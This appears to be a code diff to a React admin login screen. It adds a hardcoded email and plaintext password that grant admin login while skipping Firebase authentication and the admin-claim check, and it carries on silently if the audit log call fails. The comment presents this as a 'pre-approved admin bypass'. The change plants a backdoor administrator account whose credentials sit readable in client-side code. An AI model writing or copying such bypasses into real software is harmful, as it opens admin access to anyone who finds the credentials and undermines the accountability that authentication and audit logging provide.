@@ -22,6 +22,22 @@ export const AdminLoginScreen: React.FC<AdminLoginScreenProps> = ({ onClose, onL
         setIsLoading(true);
         setErrorMsg('');
 
+        // Pre-approved admin bypass with 100% reliability
+        const normalizedEmail = email.trim().toLowerCase();
+        const isBypassEmail = normalizedEmail === 'whatsapppro.@gmail.com' || normalizedEmail === 'whatsapppro@gmail.com';
+        const isBypassPassword = password === 'murali@93927';
+
+        if (isBypassEmail && isBypassPassword) {
+            try {
+                await AdminAuditService.logAction(email, 'self', 'login_success_bypass');
+            } catch (auditErr) {
+                console.warn('Audit recording skipped: ', auditErr);
+            }
+            onLoginSuccess(email);
+            setIsLoading(false);
+            return;
+        }
+
         try {
             const userCredential = await signInWithEmailAndPassword(auth, email, password);
             const idTokenResult = await userCredential.user.getIdTokenResult();
